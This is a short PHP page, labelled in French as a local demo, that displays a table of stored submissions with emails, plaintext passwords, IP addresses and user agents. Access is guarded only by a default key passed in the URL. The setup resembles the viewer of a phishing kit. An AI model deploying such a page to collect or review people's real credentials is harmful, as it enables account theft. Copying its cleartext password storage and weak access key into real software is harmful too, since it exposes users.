<?php
// Simple submissions viewer (protected by a query-key).
// Access example: /view.php?key=changeme

declare(strict_types=1);

const VIEW_KEY = 'changeme'; // change for your demo

$key = $_GET['key'] ?? '';
if ($key !== VIEW_KEY) {
    http_response_code(403);
    header('Content-Type: text/plain; charset=utf-8');
    echo 'Access denied: invalid key';
    exit;
}

$config = require __DIR__ . '/config.php';
$driver = $config['driver'] ?? 'sqlite';

try {
    if ($driver === 'mysql') {
        $c = $config['mysql'];
        $dsn = sprintf('mysql:host=%s;port=%s;dbname=%s;charset=%s', $c['host'], $c['port'], $c['dbname'], $c['charset']);
        $pdo = new PDO($dsn, $c['user'], $c['pass'], [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        ]);
    } else {
        $dbPath = $config['sqlite']['path'];
        if (!file_exists($dbPath)) {
            header('Content-Type: text/plain; charset=utf-8');
            echo 'No data (DB file missing).';
            exit;
        }
        $pdo = new PDO('sqlite:' . $dbPath, options: [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        ]);
    }
    $rows = $pdo->query('SELECT id, email, password, ip, user_agent, created_at FROM submissions ORDER BY id DESC')->fetchAll();
} catch (Throwable $e) {
    http_response_code(500);
    header('Content-Type: text/plain; charset=utf-8');
    echo 'Read error: ' . $e->getMessage();
    exit;
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Submissions — Démo</title>
  <style>
    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; background:#f2f3f5; margin:0; }
    .wrap { max-width: 960px; margin: 2rem auto; background: #fff; padding: 1.5rem; border-radius: 10px; box-shadow: 0 5px 25px rgba(0,0,0,.08); }
    table { border-collapse: collapse; width: 100%; }
    th, td { border: 1px solid #e5e7eb; padding: .5rem .6rem; text-align: left; font-size: .9rem; }
    th { background:#f9fafb; }
    code { background:#f3f4f6; padding: .1rem .3rem; border-radius: 4px; }
  </style>
</head>
<body>
  <div class="wrap">
    <h1>Données de soumission (démo locale)</h1>
    <?php if (!$rows): ?>
      <p>Aucune entrée.</p>
    <?php else: ?>
      <table>
        <thead>
          <tr>
            <th>#</th>
            <th>Email</th>
            <th>Password</th>
            <th>IP</th>
            <th>User-Agent</th>
            <th>Horodatage (UTC)</th>
          </tr>
        </thead>
        <tbody>
          <?php foreach ($rows as $r): ?>
            <tr>
              <td><?= htmlspecialchars((string)$r['id']) ?></td>
              <td><code><?= htmlspecialchars($r['email']) ?></code></td>
              <td><code><?= htmlspecialchars($r['password']) ?></code></td>
              <td><?= htmlspecialchars($r['ip']) ?></td>
              <td><?= htmlspecialchars($r['user_agent']) ?></td>
              <td><?= htmlspecialchars($r['created_at']) ?></td>
            </tr>
          <?php endforeach; ?>
        </tbody>
      </table>
    <?php endif; ?>
  </div>
</body>
</html>
